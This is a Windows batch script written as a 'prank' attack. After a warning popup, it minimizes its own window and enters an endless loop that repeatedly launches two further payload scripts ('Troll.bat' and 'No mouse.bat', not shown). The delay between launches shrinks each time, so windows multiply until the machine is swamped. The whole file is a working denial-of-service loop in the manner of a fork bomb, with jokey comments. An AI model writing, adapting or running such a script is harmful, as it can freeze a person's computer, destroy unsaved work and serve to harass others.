@echo off
@powershell (New-Object -ComObject Wscript.Shell).Popup("""THIS IS NO JOKE, IF YOU HAVE WORK OPEN SAVE IT. Open this only if you know what you are doing. If you dont, CLOSE THE COMMAND PROMPT BEHIND THIS MESSAGE BEFORE ANYTHING ELSE. If you know what you are doing, go ahead and have some fun.""",0,"""ARE YOU SURE?""",0x10 + 4096)
:: |||A few restarts in making this...|||
:: |||Hide the window hehe|||
@powershell -window Minimize -command ""
::powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }"
:: |||Initial Timeout and declaration of variables? *yawn*|||
timeout = 60
set /a AcceleratingTimeBomb=10
msg * Will begin in %AcceleratingTimeBomb% seconds
:: |||Ooga booga something happen|||
:start
start "New Window" cmd /c "%~dp0\MITCHEL PAYLOAD\Troll.bat"
start "New Window" cmd /c "%~dp0\MITCHEL PAYLOAD\No mouse.bat"
msg * REINFORCEMENTS IN %AcceleratingTimeBomb% seconds
echo New window in: %AcceleratingTimeBomb% seconds
if %AcceleratingTimeBomb% GEQ 1 (
timeout %AcceleratingTimeBomb% >nul
set /a AcceleratingTimeBomb = %AcceleratingTimeBomb%-1
)
if %AcceleratingTimeBomb% LEQ 1 (
timeout 1 >nul
)
goto start
:: |||Uh oh ooga booga bad...|||